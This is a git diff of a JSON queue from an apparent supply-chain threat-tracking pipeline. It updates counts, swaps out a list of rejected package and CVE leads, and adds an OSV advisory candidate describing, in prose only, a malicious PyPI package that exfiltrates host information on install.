@@ -1,6 +1,6 @@
 {
   "schema_version": "threatpedia-supply-chain-candidate-queue/1",
-  "generated_at": "2026-06-24T16:40:11.723Z",
+  "generated_at": "2026-06-24T18:18:12.727Z",
   "mode": "live",
   "drafting_enabled": false,
   "auto_drafting_allowed": false,
@@ -22,594 +22,648 @@
   },
   "summary": {
     "raw_leads_loaded": 240,
-    "deduped_subjects": 220,
+    "deduped_subjects": 222,
     "rejected_low_relevance": 80,
-    "classifier_candidates": 140,
+    "classifier_candidates": 142,
     "candidates_emitted": 40,
-    "candidates_carried_forward": 0,
+    "candidates_carried_forward": 1,
     "current_candidates": 40,
     "matched_existing": 2,
     "collector_errors": 0
   },
   "currency": {
     "latest_corpus_incident_at": "2026-05-28T00:00:00.000Z",
-    "latest_discovery_signal_at": "2026-06-24T16:16:22.129Z",
+    "latest_discovery_signal_at": "2026-06-24T18:16:25.000Z",
     "pending_candidate_count": 40,
     "pending_current_count": 40,
     "graph_latest_reflects": "discovery"
   },
   "feed_cursors": {
     "go": {
-      "cursor": "2026-06-24T10:40:24.094196Z",
+      "cursor": "2026-06-24T10:40:49.411716Z",
       "boundary_keys": [
-        "github.com/daptin/daptin\tv0.12.25\t2026-06-24T10:40:24.094196Z"
+        "github.com/apache/tomcat-jakartaee-migration\tv0.0.0-20260622063900-32db964c8906\t2026-06-24T10:40:49.411716Z"
       ]
     }
   },
   "collector_errors": [],
   "rejected": [
     {
-      "canonicalSubjectId": "pkg:npm/metamask-previews/approval-controller@3.5.0-preview.d32a7cc",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-gdf-information-lib-delete-snippet@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:3d2c4becfeee"
+        "npm-registry:5c2a21937086"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/tyravel/redis@0.9.1",
+      "canonicalSubjectId": "pkg:npm/better-ui-cli@2.1.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:6350388f6d72"
+        "npm-registry:de38e2cbab5d"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/glideapps/uapi@2.0.0",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-gdf-information-lib-create-snippet@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:ea71b332c53d"
+        "npm-registry:115747044546"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/symforge@8.8.4",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-gdf-information-lib@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:4fd7713e1dd8"
+        "npm-registry:315087b43158"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/metamask-previews/app-metadata-controller@0.0.0-preview-8365901",
+      "canonicalSubjectId": "pkg:npm/paicku@0.0.8",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:6d8cbcb3612b"
+        "npm-registry:5049b3080766"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/glideapps/ts-necessities@2.4.0",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-filebased-dataimport@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:286de4182d38"
+        "npm-registry:df51f45883ba"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/tyravel/database-pg@0.9.1",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-gdf-dch@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:21b403761c4f"
+        "npm-registry:e61706bcc89c"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/glideapps/ts-helper@6.0.1",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-fieldset@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:142c4f82fa16"
+        "npm-registry:e52195d55268"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/webirr@2.0.2",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-field-service@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:7615362d7ebc"
+        "npm-registry:fd7a9cf02795"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/symforge-macos-arm64@8.8.4",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-explainability@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:20bbb276e608"
+        "npm-registry:edf15ceef0ac"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/hd-team/app-dnpkg-beta@1.0.20260625002500",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-externaldocument@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:8fe7dd23f252"
+        "npm-registry:cf775a8b1933"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/car-runtime@0.30.0",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-eri@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:b0868388b438"
+        "npm-registry:5ececf6cce2f"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/metamask-previews/announcement-controller@4.0.0-preview.d32a7cc",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-epc@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:ec63ff093331"
+        "npm-registry:50be95e35420"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/tyravel/database-mysql@0.9.1",
+      "canonicalSubjectId": "pkg:npm/cascateer/core@2.4.33",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:d806c608ac3f"
+        "npm-registry:ecdfbdf2ea9c"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/firestitch/report@18.0.1",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-energy-utilities@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:2919a3ab29ab"
+        "npm-registry:b2c6170e7fec"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/tyravel/database@0.10.0",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-education@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:2e39d319a1cb"
+        "npm-registry:17e4382d0434"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/metamask-previews/analytics-data-regulation-controller@0.0.0-preview-52f4a2ca",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-docgen@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:5f6a85e3cfd5"
+        "npm-registry:eedd54b54c41"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/glideapps/vitest-v8-json-coverage-summary@0.0.0-quebec",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-dfo@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:16f24a9832c1"
+        "npm-registry:56a2d43887d0"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/symforge-macos-x64@8.9.0",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-decisiontable@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:678eff9ebdd1"
+        "npm-registry:6d065aeeec47"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/metamask-previews/analytics-controller@0.0.0-preview-b8454d32",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-decision-matrix-designer@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:135aa93d22b4"
+        "npm-registry:f21c294f2575"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/glideapps/tables@1.0.21",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-cpq@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:d53c1b35793b"
+        "npm-registry:a92e873d878f"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/tyravel/validation@0.10.0",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-data-processing-engine@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:d7a21c98cf9f"
+        "npm-registry:74e2670b7f15"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/snk-rich-text-editor@0.0.2",
+      "canonicalSubjectId": "pkg:npm/wormclaude@1.0.177",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:0f34cd8b8fc0"
+        "npm-registry:24c834f009ef"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/graphql-hive/gateway@2.9.0",
+      "canonicalSubjectId": "pkg:npm/opencode-sdd@1.1.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:58c120a8d40d"
+        "npm-registry:9e2f1043b0c7"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/glideapps/screen-agent@0.0.3-beta05",
+      "canonicalSubjectId": "pkg:npm/salesforce/lds-adapters-industries-context@1.445.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:9d249cad5365"
+        "npm-registry:2e4cb2897252"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/hashicorp/terraform/internal/backend/remote-state/azure@v0.0.0-20260624103449-178e8feae4bc",
+      "canonicalSubjectId": "pkg:golang/github.com/angular/angular-cli@v22.1.0-next.1%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:bc3623ef309f"
+        "go-index:fc57f99663bb"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/labring/sealos/controllers/node@v0.0.0-20260624100150-8b7472d94f75",
+      "canonicalSubjectId": "pkg:golang/github.com/staziss/superbotgo@v1.4.10-0.20260623172221-ce11844cf9aa",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:8f7eb21ac192"
+        "go-index:6907fdf41908"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/stackrox/stackrox/tools/check-workflow-run@v0.0.0-20260624102022-49da00a2f245",
+      "canonicalSubjectId": "pkg:golang/github.com/giantswarm/mcp-debug@v0.0.106",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:231336c8ef9c"
+        "go-index:4c49505469f5"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/wso2/carbon-apimgt@v6.8.103%2Bincompatible",
+      "canonicalSubjectId": "pkg:golang/github.com/OpenRewrite/rewrite@v8.85.6-0.20260624081305-c37339d158dd%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:c5156eeba432"
+        "go-index:4e81d3ae89d9"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/xmtp/proto/grpc/go@v1.3.0-20260618223123-e61687448568.3",
+      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.5.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:cb3a4bb1d041"
+        "go-index:3694975eb56b"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apache/pdfbox@v0.0.0-20260624065425-833ed8f378f0",
+      "canonicalSubjectId": "pkg:golang/github.com/tofee/rclone@v0.0.0-20260611192440-18e7034294fe",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:bb19d4633b19"
+        "go-index:80ab4872b6d2"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/hashicorp/terraform/internal/backend/remote-state/gcs@v0.0.0-20260624103449-178e8feae4bc",
+      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v0.1.3",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:219890e0c337"
+        "go-index:0abaecc55126"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/hashicorp/terraform/internal/legacy@v0.0.0-20260624103449-178e8feae4bc",
+      "canonicalSubjectId": "pkg:golang/github.com/pingcap/tikv@v9.0.0-beta.2.pre.0.20260623115822-852b97754089%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:1d4986d4adcd"
+        "go-index:c8cf453dc8e9"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/hashicorp/terraform/internal/backend/remote-state/oss@v0.0.0-20260624103449-178e8feae4bc",
+      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.1.2",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:bf2e4d1f6264"
+        "go-index:c342c19a70ab"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/angr/angr@v0.0.0-20260624004745-b61879f7499c",
+      "canonicalSubjectId": "pkg:golang/github.com/adguardteam/nativelibscommon@v8.1.36-0.20260620184552-bc36ee55fcd4%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:6e268d690bc2"
+        "go-index:827d7f141353"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/home-assistant/ios@v0.0.0-20260624101432-02b38d1b5060",
+      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.3.3",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:8291155fbd93"
+        "go-index:0ff5e5cbe09a"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.1.4",
+      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.5.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:e297cc3dafb3"
+        "go-index:4885fba47b7e"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/infracost/vcs@v0.4.0",
+      "canonicalSubjectId": "pkg:golang/github.com/apache/skywalking-showcase@v0.0.0-20260624022012-544fdd47fd54",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:6ef359896700"
+        "go-index:9963e0500a9c"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apache/ozone@v0.0.0-20260624095423-182aaa77994e",
+      "canonicalSubjectId": "pkg:golang/github.com/wso2/carbon-apimgt@v9.0.151%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:55ba20f3485a"
+        "go-index:ad99ef3cd58f"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.3.0",
+      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.4.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:b8f0241aa3a5"
+        "go-index:aa95a9026a43"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.1.3",
+      "canonicalSubjectId": "pkg:golang/github.com/daptin/daptin@v0.12.24",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:6050dd530ce2"
+        "go-index:772f11fb452d"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/grafana/grafana/pkg/util/sqlite@v0.0.0-20260624103413-675c35e9e908",
+      "canonicalSubjectId": "pkg:golang/github.com/filecoin-project/go-lotus@v1.28.2-0.20260624034659-14730b091afb",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:5cd41ac220ab"
+        "go-index:46208562e8f6"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/grafana/grafana/pkg/storage/unified/resourcepb@v0.0.0-20260624103413-675c35e9e908",
+      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.6.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:aaee868115b9"
+        "go-index:e011fdc5315d"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apache/iggy/examples/go@v0.0.0-20260624093800-73251f3abc49",
+      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.4.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:56dccb0c6d49"
+        "go-index:27c3269d5808"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apache/nifi@v0.0.0-20260624074359-eae30cdcaa42",
+      "canonicalSubjectId": "pkg:golang/github.com/shaik-sirajuddin/memory@v1.2.43",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:4561aea11744"
+        "go-index:dcab183a3e2e"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/xmtp/proto/grpc/go@v1.2.0-20260618223123-e61687448568.1",
+      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.3.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:edfd48f97af7"
+        "go-index:15f83aff98ee"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.3.0",
+      "canonicalSubjectId": "pkg:golang/github.com/1Panel-dev/1Panel@v0.0.0-20260624102351-3e0d0bb8091a",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:da96c832c7fc"
+        "go-index:9b2862c78d1b"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.7.0",
+      "canonicalSubjectId": "pkg:golang/github.com/apappascs/mcp-servers-hub@v0.0.0-20260623162340-a4febb585704",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:50ac9a6506b7"
+        "go-index:342f63b1abe1"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.6.0",
+      "canonicalSubjectId": "pkg:golang/github.com/wso2/carbon-apimgt@v6.5.215%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:5c6218142448"
+        "go-index:984686a07485"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/daptin/daptin@v0.12.25",
+      "canonicalSubjectId": "pkg:golang/github.com/apache/tomcat-jakartaee-migration@v0.0.0-20260622063900-32db964c8906",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:21d3ae193c6f"
+        "go-index:513c1f5cd998"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2023-28769",
+      "canonicalSubjectId": "CVE-2021-4448",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2023-28769"
+        "vulncheck-kev:CVE-2021-4448"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2022-45440",
+      "canonicalSubjectId": "CVE-2023-7286",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2022-45440"
+        "vulncheck-kev:CVE-2023-7286"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2020-15069",
+      "canonicalSubjectId": "CVE-2024-9463",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2020-15069"
+        "vulncheck-kev:CVE-2024-9463"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2020-29574",
+      "canonicalSubjectId": "CVE-2024-28987",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2020-29574"
+        "vulncheck-kev:CVE-2024-28987"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-1597",
+      "canonicalSubjectId": "CVE-2021-4443",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-1597"
+        "vulncheck-kev:CVE-2021-4443"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-10392",
+      "canonicalSubjectId": "CVE-2020-36837",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-10392"
+        "vulncheck-kev:CVE-2020-36837"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2023-23897",
+      "canonicalSubjectId": "CVE-2020-36836",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2023-23897"
+        "vulncheck-kev:CVE-2020-36836"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-21894",
+      "canonicalSubjectId": "CVE-2016-15040",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-21894"
+        "vulncheck-kev:CVE-2016-15040"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2020-9910",
+      "canonicalSubjectId": "CVE-2022-4974",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2020-9910"
+        "vulncheck-kev:CVE-2022-4974"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-51567",
+      "canonicalSubjectId": "CVE-2012-10018",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-51567"
+        "vulncheck-kev:CVE-2012-10018"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2020-9870",
+      "canonicalSubjectId": "CVE-2016-15041",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2020-9870"
+        "vulncheck-kev:CVE-2016-15041"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-51568",
+      "canonicalSubjectId": "CVE-2024-8877",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-51568"
+        "vulncheck-kev:CVE-2024-8877"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-51378",
+      "canonicalSubjectId": "CVE-2014-4663",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-51378"
+        "vulncheck-kev:CVE-2014-4663"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-9161",
+      "canonicalSubjectId": "CVE-2022-4972",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-9161"
+        "vulncheck-kev:CVE-2022-4972"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-20481",
+      "canonicalSubjectId": "CVE-2023-7288",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-20481"
+        "vulncheck-kev:CVE-2023-7288"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-47575",
+      "canonicalSubjectId": "CVE-2024-45409",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-47575"
+        "vulncheck-kev:CVE-2024-45409"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-38816",
+      "canonicalSubjectId": "CVE-2023-7292",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-38816"
+        "vulncheck-kev:CVE-2023-7292"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2020-11900",
+      "canonicalSubjectId": "CVE-2022-4971",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2020-11900"
+        "vulncheck-kev:CVE-2022-4971"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2023-20263",
+      "canonicalSubjectId": "CVE-2019-25215",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2023-20263"
+        "vulncheck-kev:CVE-2019-25215"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-38094",
+      "canonicalSubjectId": "CVE-2019-25217",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-38094"
+        "vulncheck-kev:CVE-2019-25217"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2023-7289",
+      "canonicalSubjectId": "CVE-2021-4445",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2023-7289"
+        "vulncheck-kev:CVE-2021-4445"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2023-7291",
+      "canonicalSubjectId": "CVE-2023-7290",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2023-7291"
+        "vulncheck-kev:CVE-2023-7290"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2023-7293",
+      "canonicalSubjectId": "CVE-2019-25213",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2023-7293"
+        "vulncheck-kev:CVE-2019-25213"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2017-20194",
+      "canonicalSubjectId": "CVE-2019-25214",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2017-20194"
+        "vulncheck-kev:CVE-2019-25214"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2020-36842",
+      "canonicalSubjectId": "CVE-2022-4973",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2020-36842"
+        "vulncheck-kev:CVE-2022-4973"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2016-15042",
+      "canonicalSubjectId": "CVE-2021-4446",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2016-15042"
+        "vulncheck-kev:CVE-2021-4446"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2020-36831",
+      "canonicalSubjectId": "CVE-2020-36835",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2020-36831"
+        "vulncheck-kev:CVE-2020-36835"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2020-36834",
+      "canonicalSubjectId": "CVE-2018-25105",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2020-36834"
+        "vulncheck-kev:CVE-2018-25105"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2021-4444",
+      "canonicalSubjectId": "CVE-2017-20192",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2021-4444"
+        "vulncheck-kev:CVE-2017-20192"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2020-36832",
+      "canonicalSubjectId": "CVE-2024-42640",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2020-36832"
+        "vulncheck-kev:CVE-2024-42640"
       ]
     }
   ],
   "candidates": [
+    {
+      "candidateId": "SC-CAND-6b47687dbadb6a83",
+      "canonicalSubjectId": "MAL-2026-6400",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in python-dateutil2 (PyPI)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: kam193 (fbd1a31a38c7a6487545ce3e039371443c9ac80c7dc0ff9b22a46db6686244b2) Installing the package or importing the module exfiltrates basic information about the host, and the package has no other purpose. --- Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities. Campaign: GENERIC-standard-pypi-install-pentest Reasons (based on the campaign): - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk. - The package overrides the install command in setup.py to execute malicious code during installation.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6400"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6400"
+      ],
+      "firstSeenAt": "2026-06-24T16:27:52.000Z",
+      "lastMaterialActivityAt": "2026-06-24T17:00:45.436Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T17:00:45.436Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
     {
       "candidateId": "SC-CAND-ed6284dc16b40d22",
